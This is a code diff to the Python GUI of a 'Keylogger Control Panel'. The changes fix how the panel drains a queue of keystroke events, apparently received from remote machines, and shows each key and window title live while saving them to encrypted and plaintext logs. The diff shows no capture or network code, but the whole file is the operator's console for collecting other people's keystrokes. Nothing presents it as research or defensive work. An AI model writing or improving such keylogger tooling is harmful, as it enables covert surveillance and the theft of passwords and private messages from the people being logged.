@@ -3,6 +3,7 @@ import os, glob, re, tkinter as tk, queue
 import customtkinter as ctk
 from tkinter import ttk, filedialog, messagebox
 from datetime import datetime
+import queue
 
 # ABSOLUTE imports so running "python startup.py" works
 from modules.crypto import set_password_for_new_key, encrypt_line, decrypt_line
@@ -65,12 +66,14 @@ class App(ctk.CTk):
         # state
         self.base_rows = []
         self.sort_by, self.sort_asc = "time", True
+        self._incoming_queue = None
+        self._drain_job = None
+        self._log_fn = None
 
         # ========== HEADER ==========
         header = ctk.CTkFrame(self, fg_color=TOKENS["bg"])
         header.pack(fill="x", padx=20, pady=(16, 8))
 
-        # brand row
         brand = ctk.CTkLabel(
             header,
             text="Keylogger Control Panel",
@@ -328,42 +331,69 @@ class App(ctk.CTk):
             messagebox.showerror("Export failed", str(e))
 
     # ====== incoming event queue (from startup.py receiver) ======
-    def attach_event_queue(self, q: "queue.Queue", log_fn=None):
+    def attach_event_queue(self, q, log_fn=None):
         """
         Called by startup.py:
-          - q supplies dict events like {"ts","window","key","type","_remote"}
-          - we convert to your plaintext formats, write encrypted log via _on_keylog,
-            and show a parsed row live in the preview table.
+          q supplies dict events like {"ts","window","key","type","_remote"}
         """
-        self._incoming_q = q
-        self._log_fn = log_fn  # not required; kept for symmetry
-        self.after(100, self._drain_incoming_events)
+        self._incoming_queue = q
+        self._log_fn = log_fn
+        # start draining only once the queue exists
+        if not self._drain_job:
+            self._drain_job = self.after(100, self._drain_incoming_events)
+        try:
+            self.status.configure(text="Receiving events…")
+        except Exception:
+            pass
+
+    def _append_row(self, evt: dict):
+        """Normalise an incoming event and insert into the live table, and persist."""
+        import datetime as _dt
+
+        ts = evt.get("ts") or _dt.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
+        kind = (evt.get("type") or "KEY").upper()
+
+        # detail preference: key > text > window > generic
+        detail = (
+            (str(evt.get("key")) if evt.get("key") is not None else None) or
+            (str(evt.get("text")) if evt.get("text") is not None else None) or
+            (str(evt.get("window")) if evt.get("window") is not None else None) or
+            ""
+        )
+
+        # show live
+        self.viewer.insert("", "end", values=(ts, kind, detail))
+
+        # persist to encrypted daily file using your plaintext format
+        # (your _parse_line recognizes "YYYY-MM-DD HH:MM:SS - <detail>")
+        try:
+            if not evt.get("_already_logged"):
+                self._on_keylog(f"{ts} - {detail}")
+                evt["_already_logged"] = True
+        except Exception:
+            pass
 
     def _drain_incoming_events(self):
-        drained = False
-        while True:
+        """Poll the unified incoming queue without blocking, update GUI + logs."""
+        from queue import Empty  # local import to avoid global dependency if missing
+        q = self._incoming_queue
+        if q is not None:
             try:
-                evt = self._incoming_queue.get_nowait()
-            except queue.Empty:
-                break
-
-            drained = True
-
-            # send event to the GUI table
-            self._append_row(evt)
-
-            # also send to file logger, but only if not already logged
-            if getattr(self, "_log_fn", None) and not evt.get("_already_logged"):
-                try:
-                    from datetime import datetime as _dt
-                    evt["_already_logged"] = True  # mark to avoid duplicates
-                    self._log_fn({**evt, "logged_at": _dt.utcnow().isoformat() + "Z"})
-                except Exception:
-                    pass
-
-        if drained:
-            # check again in 100ms for new events
-            self.after(100, self._drain_incoming_events)
+                while True:
+                    evt = q.get_nowait()      # raises Empty when drained
+                    self._append_row(evt)
+                    # optional second sink: plaintext JSON log
+                    try:
+                        if self._log_fn and not evt.get("_already_logged"):
+                            import datetime as _dt
+                            self._log_fn({**evt, "logged_at": _dt.datetime.utcnow().isoformat() + "Z"})
+                            evt["_already_logged"] = True
+                    except Exception:
+                        pass
+            except Empty:
+                pass
+        # reschedule regardless (so the loop keeps running even if queue was empty)
+        self._drain_job = self.after(100, self._drain_incoming_events)
 
 
 def main():
